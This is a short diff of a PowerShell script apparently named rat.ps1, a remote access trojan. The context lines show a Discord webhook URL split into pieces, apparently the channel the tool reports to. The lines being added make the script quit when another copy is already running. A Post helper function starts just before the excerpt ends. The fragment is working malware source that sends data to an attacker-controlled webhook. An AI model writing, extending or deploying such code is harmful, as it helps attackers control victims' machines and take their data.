@@ -9,6 +9,13 @@ $W='https://discord.com/api/webhooks/'+'1550915076586868767/'+'Z1NukXzFi0yUb1kjQ
 $S=Join-Path $env:TEMP 'r_s.tmp'
 $script:P=2000
 
+# ---- dedup: exit if another rat.ps1 is already running ----
+try{
+  $me=[Diagnostics.Process]::GetCurrentProcess().Id
+  $dup=Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -EA 0 | Where-Object { $_.CommandLine -like '*rat.ps1*' -and $_.ProcessId -ne $me }
+  if($dup){ exit }
+}catch{}
+
 # ---- HTTP helpers ----
 function Post($text){
   try{
